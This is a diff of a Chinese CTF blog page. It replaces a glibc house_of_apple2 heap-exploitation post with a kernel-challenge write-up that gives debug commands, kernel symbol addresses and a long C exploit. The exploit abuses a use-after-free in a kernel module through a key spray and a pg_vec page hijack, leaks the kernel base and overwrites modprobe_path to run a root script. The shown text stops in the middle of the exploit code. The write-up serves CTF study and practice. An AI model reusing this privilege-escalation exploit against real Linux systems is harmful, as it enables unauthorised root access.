@@ -4,10 +4,16 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="glibc-2.39:house_of_apple2, Hexo">
-    <meta name="description" content="追一波libc版本~~
-
-在glibc-2.38版本中，笔者测试发现需要在0x88偏移的位置（应该还是_lock字段）照抄_IO_2_1_stderr的偏移0x88的位置的值，如果仅仅是写入一个合法的地址，那么将会陷入到一个死循环中；之后笔">
+    <meta name="keywords" content="强网拟态ker, q1ming">
+    <meta name="description" content="CHECKrun.sh
+init
+version
+存在cg隔离
+namespace
+逆向分析add_note
+应该是kmalloc-64；
+edit_note
+动态调试gdb -ex &amp;quot;target remote localhos">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -19,7 +25,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>glibc-2.39:house_of_apple2 | Hexo</title>
+    <title>强网拟态ker | q1ming</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
 
@@ -66,7 +72,7 @@
                     
                     <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                     
-                    <span class="logo-span">Hexo</span>
+                    <span class="logo-span">q1ming</span>
                 </a>
             </div>
             
@@ -170,7 +176,7 @@
         
         <img src="/medias/logo.png" class="logo-img circle responsive-img">
         
-        <div class="logo-name">Hexo</div>
+        <div class="logo-name">q1ming</div>
         <div class="logo-desc">
             
             Never really desperate, only the lost of the soul.
@@ -336,12 +342,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/17.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/23.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">glibc-2.39:house_of_apple2</h1>
+                    <h1 class="description center-align post-title">强网拟态ker</h1>
                 </div>
             </div>
         </div>
@@ -365,12 +371,12 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/CTF/">
-                                <span class="chip bg-color">CTF</span>
+                            <a href="/tags/kernel/">
+                                <span class="chip bg-color">kernel</span>
                             </a>
                         
-                            <a href="/tags/Heap/">
-                                <span class="chip bg-color">Heap</span>
+                            <a href="/tags/CTF/">
+                                <span class="chip bg-color">CTF</span>
                             </a>
                         
                     </div>
@@ -385,7 +391,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2025-01-15
+                    2025-01-16
                 </div>
                 
 
@@ -409,46 +415,27 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>追一波libc版本~~</p>
-<blockquote>
-<p>在glibc-2.38版本中，笔者测试发现需要在0x88偏移的位置（应该还是_lock字段）照抄_IO_2_1_stderr的偏移0x88的位置的值，如果仅仅是写入一个合法的地址，那么将会陷入到一个死循环中；之后笔者就成功劫持了控制流，但是由于开了保护，需要orw但是笔者没有找到合适的栈迁移gadget也就没继续下去；</p>
-</blockquote>
-<h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><h3 id="add-note"><a href="#add-note" class="headerlink" title="add_note"></a>add_note</h3><p><img src="/images/1736929916296.png" alt="1736929916296"></p>
-<p>0x410~0x1000之间的chunk，largebin范围；</p>
-<p>下标不可以复用；</p>
-<h3 id="free-note"><a href="#free-note" class="headerlink" title="free_note"></a>free_note</h3><p><img src="/images/1736929928964.png" alt="1736929928964"></p>
-<p>漏洞是UAF;</p>
-<h3 id="show-note"><a href="#show-note" class="headerlink" title="show_note"></a>show_note</h3><p><img src="/images/1736929939230.png" alt="1736929939230"></p>
-<p>printf+%s输出；</p>
-<h3 id="edit-note"><a href="#edit-note" class="headerlink" title="edit_note"></a>edit_note</h3><p><img src="/images/1736929948690.png" alt="1736929948690"></p>
-<p>正常read，没有溢出；</p>
-<h3 id="exit"><a href="#exit" class="headerlink" title="exit"></a>exit</h3><p><img src="/images/1736929959255.png" alt="1736929959255"></p>
-<p>exit(0);</p>
-<h2 id="largebin-attack"><a href="#largebin-attack" class="headerlink" title="largebin attack"></a>largebin attack</h2><p>largebin共占用bins数组中的64个bin，且氛围6个组，每个组的公差不一样。可以理解为这64个largebin各自管理一个范围，但是范围的大小不尽相同；</p>
-<h3 id="fd-bk域"><a href="#fd-bk域" class="headerlink" title="fd-bk域"></a>fd-bk域</h3><p>largebin的头会参与进来</p>
-<p><img src="/images/1736929968689.png" alt="1736929968689"></p>
-<p>fd-bk管理了一个largebin中的所有chunk；</p>
-<p>里边的chunk按照大小顺序进行排列，相同大小的chunk就按照进入的时间顺序进行排列；</p>
-<p>bk由小指向大，相同大小则看时间先后，fd反之；</p>
-<h3 id="fd-bk-nextsize"><a href="#fd-bk-nextsize" class="headerlink" title="fd&#x2F;bk-nextsize"></a>fd&#x2F;bk-nextsize</h3><p>fd&#x2F;bk-nextsize域的引入纯粹是为了加速chunk的寻找，是一个附加产品；</p>
-<p>fd_nextsize和bk_nextsize用于指向第一个与自己大小不同的chunk，所以也只有在加入了大小不同的chunk时这两个指针才有可能被修改；</p>
-<p>相当于从多个相同size的chunk中选出一个代表，它们组成一个双链表（largebin头不参与），加快查找速度。</p>
-<p><img src="/images/1736929983909.png" alt="1736929983909"></p>
-<h3 id="attack"><a href="#attack" class="headerlink" title="attack"></a>attack</h3><p><a href="./largebin_attack.cpp">source code</a></p>
-<p><img src="/images/1736929992360.png" alt="1736929992360"></p>
-<p>如果新来的chunk严格最小，然后largebin中最大chunk的bk_next域被写入了goal-0x20，则在上图中第8行会将goal-0x20写入到victim-&gt;bk_nextsize中，然后到了第9行的时候，直接使用这个地址，将其fd_nextsize域里写入victim，也就实现了向goal中写入victim地址；</p>
-<p>所以，对于largebin attack的利用方法总结如下：</p>
-<p><img src="/images/1736929999230.png" alt="1736929999230"></p>
-<h2 id="house-of-apple2"><a href="#house-of-apple2" class="headerlink" title="house_of_apple2"></a>house_of_apple2</h2><p><img src="/images/1736930007196.png" alt="1736930007196"></p>
-<h3 id="栈迁移打法"><a href="#栈迁移打法" class="headerlink" title="栈迁移打法"></a>栈迁移打法</h3><p>在glibc-2.39找到了一个magic可以用：</p>
-<p>发现house_of_apple2执行的时候，rax、rbx、rdi都指向f1_addr:</p>
-<p><img src="/images/1736930016485.png" alt="1736930016485"></p>
-<p>所以找到如下magic：</p>
-<p><img src="/images/1736930025727.png" alt="1736930025727"></p>
-<p>对于rdx的控制要用下面这个gadget：</p>
-<p><img src="/images/1736930034065.png" alt="1736930034065"></p>
-<p>setcontext+61如下：</p>
-<p><img src="/images/1736930046159.png" alt="1736930046159"></p>
+                <h2 id="CHECK"><a href="#CHECK" class="headerlink" title="CHECK"></a>CHECK</h2><h3 id="run-sh"><a href="#run-sh" class="headerlink" title="run.sh"></a>run.sh</h3><p><img src="/images/1729325196103.png"></p>
+<h3 id="init"><a href="#init" class="headerlink" title="init"></a>init</h3><p><img src="/images/1729325270735.png"></p>
+<h3 id="version"><a href="#version" class="headerlink" title="version"></a>version</h3><p><img src="/images/1729325314512.png"></p>
+<h3 id="存在cg隔离"><a href="#存在cg隔离" class="headerlink" title="存在cg隔离"></a>存在cg隔离</h3><p><img src="/images/1729325596214.png"></p>
+<h3 id="namespace"><a href="#namespace" class="headerlink" title="namespace"></a>namespace</h3><p><img src="/images/1729325834515.png"></p>
+<h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><h3 id="add-note"><a href="#add-note" class="headerlink" title="add_note"></a>add_note</h3><p><img src="/images/1729325662938.png"></p>
+<p>应该是kmalloc-64；</p>
+<h3 id="edit-note"><a href="#edit-note" class="headerlink" title="edit_note"></a>edit_note</h3><p><img src="/images/1729325943000.png"></p>
+<h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gdb -ex &quot;target remote localhost:1234&quot; -ex &quot;b *(0xffffffffc020113e)&quot; -ex &quot;c&quot;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">ffffffffc0201010 t ker_release  [ker]<br>ffffffffc0203020 d misc [ker]<br>ffffffffc02010c0 t ker_ioctl    [ker]<br>ffffffffc0203190 d __UNIQUE_ID___addressable_cleanup_module253  [k]<br>ffffffffc0203080 d fops [ker]<br>ffffffffc0201000 t __pfx_ker_release    [ker]<br>ffffffffc02010b0 t __pfx_ker_ioctl      [ker]<br>ffffffffc02050cc r _note_15     [ker]<br>ffffffffc02050e4 r _note_14     [ker]<br>ffffffffc02031c0 d __this_module        [ker]<br>ffffffffc0201080 t cleanup_module       [ker]<br>ffffffffc02036c0 b delete_idx   [ker]<br>ffffffffc02036c4 b edit_idx     [ker]<br>ffffffffc0201040 t init_module  [ker]<br>ffffffffc0201030 t __pfx_init_module    [ker]<br>ffffffffc0201040 t kernel_init  [ker]<br>ffffffffc0201070 t __pfx_kernel_exit    [ker]<br>ffffffffc0201070 t __pfx_cleanup_module [ker]<br>ffffffffc0201080 t kernel_exit  [ker]<br>ffffffffc02036c8 b chunk        [ker]<br>ffffffffc0201030 t __pfx_kernel_init    [ker]<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">ffffffff810fc6e0 T __sys_setresuid<br><br>ffffffff81115e60 T commit_creds<br><br>ffffffff8308c620 D init_cred<br><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="攻击成功"><a href="#攻击成功" class="headerlink" title="攻击成功"></a>攻击成功</h2><p><img src="/images/1736933466292.png"></p>
+<p>拿下三血：</p>
+<p><img src="/images/1736933379775.png"></p>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/keyctl.h&gt;</span></span><br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span> <span class="hljs-params">(</span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pushf;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pop user_rflags;&quot;</span></span><br><span class="hljs-params">    )</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_root_shell</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;now pid == %p\n&quot;</span>, getpid());<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">//CPU绑核</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">bindCore</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);<br>&#125;<br><br><span class="hljs-type">int</span> dev_fd;<br><span class="hljs-type">void</span> <span class="hljs-title function_">add_note</span><span class="hljs-params">(<span class="hljs-type">char</span> *con)</span>&#123;<br>    <span class="hljs-type">void</span> *args = con;<br>    ioctl(dev_fd, <span class="hljs-number">0x20</span>, &amp;args);<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">free_note</span><span class="hljs-params">()</span>&#123;<br>    ioctl(dev_fd, <span class="hljs-number">0x30</span>, <span class="hljs-string">&quot;AAAAAAAA&quot;</span>);<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;key.h&quot;</span></span><br><br><span class="hljs-comment">//============================================= pg_vec ===================================================================</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/if_packet.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;net/if.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/if_ether.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">char</span> *s)</span>&#123;<br>    perror(s);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">unshare_setup</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">char</span> edit[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-type">int</span> tmp_fd;<br><br>    <span class="hljs-keyword">if</span>(unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET))<br>        err_exit(<span class="hljs-string">&quot;FAILED to create a new namespace&quot;</span>);<br><br>    tmp_fd = open(<span class="hljs-string">&quot;/proc/self/setgroups&quot;</span>, O_WRONLY);<br>    write(tmp_fd, <span class="hljs-string">&quot;deny&quot;</span>, <span class="hljs-built_in">strlen</span>(<span class="hljs-string">&quot;deny&quot;</span>));<br>    close(tmp_fd);<br><br>    tmp_fd = open(<span class="hljs-string">&quot;/proc/self/uid_map&quot;</span>, O_WRONLY);<br>    <span class="hljs-built_in">snprintf</span>(edit, <span class="hljs-keyword">sizeof</span>(edit), <span class="hljs-string">&quot;0 %d 1&quot;</span>, getuid());<br>    write(tmp_fd, edit, <span class="hljs-built_in">strlen</span>(edit));<br>    close(tmp_fd);<br><br>    tmp_fd = open(<span class="hljs-string">&quot;/proc/self/gid_map&quot;</span>, O_WRONLY);<br>    <span class="hljs-built_in">snprintf</span>(edit, <span class="hljs-keyword">sizeof</span>(edit), <span class="hljs-string">&quot;0 %d 1&quot;</span>, getgid());<br>    write(tmp_fd, edit, <span class="hljs-built_in">strlen</span>(edit));<br>    close(tmp_fd);<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">packet_socket_rx_ring_init</span><span class="hljs-params">(<span class="hljs-type">int</span> s, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> block_size,</span><br><span class="hljs-params">                                <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> frame_size, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> block_nr,</span><br><span class="hljs-params">                                <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> sizeof_priv, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> timeout)</span> &#123;<br>    <span class="hljs-type">int</span> v = TPACKET_V3;<br>    <span class="hljs-type">int</span> rv = setsockopt(s, SOL_PACKET, PACKET_VERSION, &amp;v, <span class="hljs-keyword">sizeof</span>(v));<br>    <span class="hljs-keyword">if</span> (rv &lt; <span class="hljs-number">0</span>) <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;setsockopt(PACKET_VERSION)&quot;</span>), <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>   <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tpacket_req3</span> <span class="hljs-title">req</span>;</span><br>    <span class="hljs-built_in">memset</span>(&amp;req, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(req));<br>    req.tp_block_size = block_size;<br>    req.tp_frame_size = frame_size;<br>    req.tp_block_nr = block_nr;<br>    req.tp_frame_nr = (block_size * block_nr) / frame_size;<br>    req.tp_retire_blk_tov = timeout;<br>    req.tp_sizeof_priv = sizeof_priv;<br>    req.tp_feature_req_word = <span class="hljs-number">0</span>;<br><br>    rv = setsockopt(s, SOL_PACKET, PACKET_RX_RING, &amp;req, <span class="hljs-keyword">sizeof</span>(req));<br>    <span class="hljs-keyword">if</span> (rv &lt; <span class="hljs-number">0</span>) <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;setsockopt(PACKET_RX_RING)&quot;</span>), <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">packet_socket_setup</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> block_size, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> frame_size,</span><br><span class="hljs-params">                        <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> block_nr, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> sizeof_priv, <span class="hljs-type">int</span> timeout)</span> &#123;<br>    <span class="hljs-type">int</span> s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));<br>    <span class="hljs-keyword">if</span> (s &lt; <span class="hljs-number">0</span>) <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;socket(AF_PACKET)&quot;</span>), <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    <br>    packet_socket_rx_ring_init(s, block_size, frame_size, block_nr, sizeof_priv, timeout);<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_ll</span> <span class="hljs-title">sa</span>;</span><br>    <span class="hljs-built_in">memset</span>(&amp;sa, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(sa));<br>    sa.sll_family = PF_PACKET;<br>    sa.sll_protocol = htons(ETH_P_ALL);<br>    sa.sll_ifindex = if_nametoindex(<span class="hljs-string">&quot;lo&quot;</span>);<br>    sa.sll_hatype = <span class="hljs-number">0</span>;<br>    sa.sll_pkttype = <span class="hljs-number">0</span>;<br>    sa.sll_halen = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-type">int</span> rv = bind(s, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;sa, <span class="hljs-keyword">sizeof</span>(sa));<br>    <span class="hljs-keyword">if</span> (rv &lt; <span class="hljs-number">0</span>) <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;bind(AF_PACKET)&quot;</span>), <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    <br>    <span class="hljs-keyword">return</span> s;<br>&#125;<br><span class="hljs-comment">// count 为 pg_vec 数组的大小, 即 pg_vec 的大小为 count*8</span><br><span class="hljs-comment">// size/4096 为要分配的 order</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">pagealloc_pad</span><span class="hljs-params">(<span class="hljs-type">int</span> count, <span class="hljs-type">int</span> size)</span> &#123;<br>    <span class="hljs-keyword">return</span> packet_socket_setup(size, <span class="hljs-number">2048</span>, count, <span class="hljs-number">0</span>, <span class="hljs-number">100</span>);<br>&#125;<br><br><span class="hljs-comment">//========================================================================================================================</span><br><br><span class="hljs-type">size_t</span> ker_offset;<br><span class="hljs-type">void</span> <span class="hljs-title function_">edit_note</span><span class="hljs-params">(<span class="hljs-type">char</span> *con)</span>&#123;<br>    <span class="hljs-type">void</span> *args = con;<br>    ioctl(dev_fd, <span class="hljs-number">0x50</span>, &amp;args);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_flag</span><span class="hljs-params">()</span>&#123;<br>    system(<span class="hljs-string">&quot;touch ./tmp/error&quot;</span>);<br>    <span class="hljs-type">int</span> efd = open(<span class="hljs-string">&quot;./tmp/error&quot;</span>, <span class="hljs-number">2</span>);<br>    write(efd, <span class="hljs-string">&quot;\xff\xff\xff\xff&quot;</span>, <span class="hljs-number">4</span>);<br>    close(efd);<br>    system(<span class="hljs-string">&quot;chmod +x ./tmp/error&quot;</span>);<br><br>    <span class="hljs-type">char</span> *cmd = <span class="hljs-string">&quot;#!/bin/sh\nchmod 777 /flag&quot;</span>;<br>    system(<span class="hljs-string">&quot;touch ./tmp/my_shell.sh&quot;</span>);<br>    <span class="hljs-type">int</span> f = open(<span class="hljs-string">&quot;./tmp/my_shell.sh&quot;</span>, <span class="hljs-number">2</span>);<br>    write(f, cmd, <span class="hljs-built_in">strlen</span>(cmd));<br>    close(f);<br>    system(<span class="hljs-string">&quot;chmod +x ./tmp/my_shell.sh&quot;</span>);<br><br>    system(<span class="hljs-string">&quot;./tmp/error&quot;</span>);<br>    <br>    <span class="hljs-type">char</span> flag[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">int</span> fd3 = open(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-number">2</span>);<br>    read(fd3, flag, <span class="hljs-number">0x80</span>);<br>    <span class="hljs-built_in">puts</span>(flag);<br>    getchar();<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><br>    save_status();<br>    bindCore(<span class="hljs-number">0</span>);<br>    unshare_setup();<br><br>    dev_fd = open(<span class="hljs-string">&quot;/dev/ker&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;dev_fd == %d\n&quot;</span>, dev_fd);<br><br>    add_note(<span class="hljs-string">&quot;AAAAAAAA&quot;</span>);<br>    free_note();<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TOTAL_KEYS 200</span><br>    <span class="hljs-type">int</span> key_ids[TOTAL_KEYS];<br>    <span class="hljs-type">char</span> des[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-type">char</span> pay[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-built_in">memset</span>(des, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(des));<br>    <span class="hljs-built_in">memset</span>(pay, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(pay));<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; TOTAL_KEYS; i++)&#123;<br>        <span class="hljs-built_in">memset</span>(des, <span class="hljs-string">&#x27;A&#x27;</span>+i, <span class="hljs-number">0x80</span>);<br>        <span class="hljs-built_in">memset</span>(pay, <span class="hljs-string">&#x27;a&#x27;</span>+i, <span class="hljs-number">0x40</span><span class="hljs-number">-0x18</span>);<br>        key_ids[i] = key_alloc(des, pay, <span class="hljs-number">0x40</span><span class="hljs-number">-0x18</span>);<br>        <span class="hljs-comment">//printf(&quot;kid == %d\n&quot;, key_ids[i]);</span><br>    &#125;<br>    free_note();<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TOTAL_PFDS 200</span><br>    <span class="hljs-type">int</span> pfds[TOTAL_PFDS];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; TOTAL_PFDS; i++)&#123;<br>        pfds[i] = pagealloc_pad(<span class="hljs-number">8</span>, <span class="hljs-number">0x1000</span>);<br>        <span class="hljs-keyword">if</span>(pfds[i] &lt; <span class="hljs-number">0</span>)&#123;<br>            perror(<span class="hljs-string">&quot;pfds&quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-comment">//printf(&quot;pfd == %d\n&quot;, pfds[i]);</span><br>    &#125;<br><br>    <span class="hljs-type">int</span> victim_kid = <span class="hljs-number">-1</span>;<br>    <span class="hljs-type">size_t</span> data[<span class="hljs-number">0x10000</span>];<br>    <span class="hljs-type">int</span> keylen;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; TOTAL_KEYS; i++)&#123;<br>        keylen = key_read(key_ids[i], data, <span class="hljs-number">0x40</span><span class="hljs-number">-0x18</span>);<br>        <span class="hljs-keyword">if</span>(keylen &gt; <span class="hljs-number">0x28</span>)&#123;<br>            victim_kid = i;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;victim_kid == %d\n&quot;</span>, victim_kid);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; TOTAL_KEYS; i++)&#123;<br>        <span class="hljs-keyword">if</span>(i == victim_kid) <span class="hljs-keyword">continue</span>;<br>        key_revoke(key_ids[i]);<br>    &#125;<br><br>    <span class="hljs-comment">//leak goal 0xffffffff81d5d250</span><br>    <span class="hljs-type">size_t</span> leak = <span class="hljs-number">0LL</span>;<br>    key_read(key_ids[victim_kid], data, keylen);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x1000</span>; i++)&#123;<br>        <span class="hljs-comment">//printf(&quot;leak : %p\n&quot;, (void *)data[i]);</span><br>        <span class="hljs-keyword">if</span>(data[i] &gt;= <span class="hljs-number">0xffffffff00000000</span>)&#123;<br>            <span class="hljs-keyword">if</span>((data[i] &amp; <span class="hljs-number">0xffff</span>) == <span class="hljs-number">0xd250</span>)&#123;<br>                leak = data[i];<br>                ker_offset = leak - <span class="hljs-number">0xffffffff81d5d250</span>;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span>((data[i] &amp; <span class="hljs-number">0xffff</span>) == <span class="hljs-number">0x6070</span>)&#123;<br>                leak = data[i];<br>                ker_offset = leak - <span class="hljs-number">0xffffffff81e26070</span>;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span>((data[i] &amp; <span class="hljs-number">0xffff</span>) == <span class="hljs-number">0x8850</span>)&#123;<br>                leak = data[i];<br>                ker_offset = leak - <span class="hljs-number">0xffffffff81608850</span>;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span>((data[i] &amp; <span class="hljs-number">0xffff</span>) == <span class="hljs-number">0xca40</span>)&#123;<br>                leak = data[i];<br>                ker_offset = leak - <span class="hljs-number">0xffffffff8236ca40</span>;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;leak == %p\n&quot;</span>, (<span class="hljs-type">void</span> *)leak);<br><br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ker_offset == %p\n&quot;</span>, (<span class="hljs-type">void</span> *)ker_offset);<br>    <span class="hljs-type">size_t</span> func_addr = ker_offset + <span class="hljs-number">0xffffffff810fc6e0</span>;<br>    <span class="hljs-type">size_t</span> modprobe = ker_offset + <span class="hljs-number">0xffffffff831d8ce0</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;goal : %p\n&quot;</span>, (<span class="hljs-type">void</span> *)func_addr);<br><br>    <span class="hljs-comment">//size_t goal_page = func_addr - (func_addr &amp; 0xfff);</span><br>    <span class="hljs-type">size_t</span> goal_page = modprobe - (modprobe &amp; <span class="hljs-number">0xfff</span>);<br>    edit_note(&amp;goal_page);<br><br>    <span class="hljs-type">char</span> *pages[TOTAL_PFDS];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; TOTAL_PFDS; i++)&#123;<br>        pages[i] = mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x1000</span>*<span class="hljs-number">8</span>, PROT_READ|PROT_WRITE, MAP_SHARED, pfds[i], <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (pages[i] == MAP_FAILED) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fail mmap id : %d, file descriptor == %d\n&quot;</span>, i, pfds[i]);<br>            perror(<span class="hljs-string">&quot;mmap&quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span 